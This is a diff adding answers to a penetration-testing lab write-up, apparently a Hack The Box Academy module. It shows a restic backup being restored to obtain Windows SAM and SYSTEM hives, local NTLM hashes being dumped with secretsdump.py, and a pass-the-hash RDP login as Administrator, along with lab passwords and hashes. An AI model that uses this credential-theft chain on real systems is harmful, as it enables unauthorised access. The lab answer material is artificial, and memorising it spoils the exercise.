@@ -383,5 +383,63 @@ RDP to 10.129.203.122 (ACADEMY-WINLPEPILLAGE-WIN01), with user `Peter` and passw
         $ xfreerdp /v:10.129.203.122 /u:Jeff /p:Webmaster001! /drive:share,/home/htb-ac-1863259/Downloads
         ```
    - Password is stored in `%USERPROFILE%\Desktop\backup.conf`
-5. Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer. **Answer:**
-6. Optional. Use the hash with a Pass-The-Hash technique to log in as the Administrator. Mark DONE when complete. **Answer:**
+5. Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer. **Answer: bac9dc5b7b4bec1d83e0e9c04b477f26**
+   - Found the `backup.conf` file on Desktop containing the restic backup for `C:\Windows\System32\config` and its password:
+        ```
+        Repository: E:\restic
+        Backup Directories: 
+        - C:\Windows\System32\config
+        - C:\xampp\htdocs\webapp_old
+        Password: Superbackup!
+
+        Sample:
+
+        restic.exe -r E:\restic snapshots
+        ```
+   - Check backup snapshots saved in this repository and backup the latest one:
+        ```powershell
+        PS C:\Restore\C\Windows\System32> restic.exe -r E:\restic\ snapshots
+        enter password for repository:
+        repository 2e40703c opened successfully, password is correct
+        found 1 old cache directories in C:\Users\jeff\AppData\Local\restic, run `restic cache --cleanup` to remove them
+        ID        Time                 Host             Tags        Paths
+        --------------------------------------------------------------------------------------
+        02d25030  2022-08-09 05:58:15  PILLAGING-WIN01              C:\xampp\htdocs\webapp
+        24504d3d  2022-08-09 11:24:43  PILLAGING-WIN01              C:\Windows\System32\config
+        7b9cabc8  2022-08-09 11:25:47  PILLAGING-WIN01              C:\Windows\System32\config
+        4e7bd0cd  2022-08-09 11:55:33  PILLAGING-WIN01              C:\xampp\htdocs\webapp_old
+        b2f5caa0  2022-08-17 11:43:56  PILLAGING-WIN01              C:\Windows\System32\config
+        --------------------------------------------------------------------------------------
+        5 snapshots
+        PS C:\Restore\C\Windows\System32> restic.exe -r E:\restic\ restore b2f5caa0 --target C:\Restore2
+        enter password for repository:
+        repository 2e40703c opened successfully, password is correct
+        found 1 old cache directories in C:\Users\jeff\AppData\Local\restic, run `restic cache --cleanup` to remove them
+        restoring <Snapshot b2f5caa0 of [C:\Windows\System32\config] at 2022-08-09 11:24:43.2720487 -0700 PDT by PILLAGING-WIN01\lab_admin@PILLAGING-WIN01> to C:\Restore
+        PS C:\Restore\C\Windows\System32> restic.exe -r E:\restic\ restore b2f5caa0 --target C:\Restore
+        ```
+   - Copy the SAM and SYSTEM file from the backup locally and use secretsdump.py to extract password hashes:
+        ```powershell
+        PS C:\Restore\C\Windows\System32> Copy-Item -Path .\config\SAM -Destination \\tsclient\share
+        PS C:\Restore\C\Windows\System32> Copy-Item -Path .\config\SYSTEM -Destination \\tsclient\share
+        ```
+        ```shellsession
+        $ secretsdump.py -sam SAM -system SYSTEM LOCAL
+        Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 
+
+        [*] Target system bootKey: 0x9828e7264dd454a4cae19b10e003858e
+        [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+        Administrator:500:aad3b435b51404eeaad3b435b51404ee:bac9dc5b7b4bec1d83e0e9c04b477f26:::
+        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2525a827e7ca4bb2504d25a70e4d1292:::
+        jeff:1004:aad3b435b51404eeaad3b435b51404ee:91b2e2ed6cd72ed531635c1b58eabe19:::
+        Grace:1005:aad3b435b51404eeaad3b435b51404ee:2abc09f151d5e95fb8805e265268e6c3:::
+        Peter:1006:aad3b435b51404eeaad3b435b51404ee:8160b16dddc064509c4ccf530c7dfaa0:::
+        [*] Cleaning up... 
+        ```
+6. Optional. Use the hash with a Pass-The-Hash technique to log in as the Administrator. Mark DONE when complete. **Answer: DONE**
+   - Use `xfreerdp` with `pth` option:
+        ```shellsession
+        $ xfreerdp /v:10.129.203.122 /u:Administrator /pth:bac9dc5b7b4bec1d83e0e9c04b477f26
+        ```
